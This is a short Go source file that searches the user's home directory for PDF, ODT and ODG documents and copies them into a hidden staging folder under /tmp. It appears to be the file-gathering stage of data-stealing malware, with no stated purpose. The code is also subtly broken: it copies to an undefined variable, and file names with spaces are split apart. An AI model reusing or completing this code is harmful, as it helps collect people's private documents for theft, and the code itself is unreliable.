package main

import (
	"os"
	"os/exec"
	"strings"
)

var path2 string = "/tmp/temp/data"

func findfiles(dir string) []byte {
	cmd1 := exec.Command("find", dir, "-type", "f", "-iname", "*.pdf")
	cmd2 := exec.Command("find", dir, "-type", "f", "-iname", "*.odt")
	cmd3 := exec.Command("find", dir, "-type", "f", "-iname", "*.odg")
	out1, _ := cmd1.Output()
	out2, _ := cmd2.Output()
	out3, _ := cmd3.Output()
	result := append(out1, out2...)
	result = append(result, out3...)
	return result
}

func copyfiles(files string) {
	for _, f := range strings.Fields(files) {
		copy := exec.Command("cp", f, path)
		copy.Run()
	}
}

func filerun() {
	home, _ := os.UserHomeDir()
	files := findfiles(home)
	copyfiles(string(files))
}
